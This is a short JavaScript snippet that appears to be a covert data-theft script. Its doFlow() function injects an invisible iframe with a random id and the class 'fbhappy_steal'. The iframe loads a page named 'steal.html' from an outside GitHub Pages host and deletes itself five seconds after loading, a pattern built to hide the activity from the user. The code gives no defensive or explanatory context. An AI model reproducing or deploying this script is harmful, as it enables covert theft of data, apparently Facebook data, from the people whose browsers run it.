function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }
 
 
 function doFlow(){
     
     var fbhappyId=makeid(5);
     var ifrm_f = document.createElement('iframe');
     ifrm_f.setAttribute('id', fbhappyId);
     ifrm_f.setAttribute('class', 'fbhappy_steal');
     ifrm_f.style.display = "none";
     document.body.appendChild(ifrm_f);
     

     var fbframe=document.getElementById(fbhappyId);

     fbframe.src ="https://jianminwang551.github.io/FunXD/steal.html";
     
     fbframe.addEventListener("load",function(){
         setTimeout(function(){
             //console.log("removing fbhappyId - "+fbhappyId);
             fbframe.parentNode.removeChild(fbframe);
             fbframe.parentNode=null;
             //console.log("remove fbhappyId - "+fbhappyId+" done");
         }, 5000);
         
     });
     
}
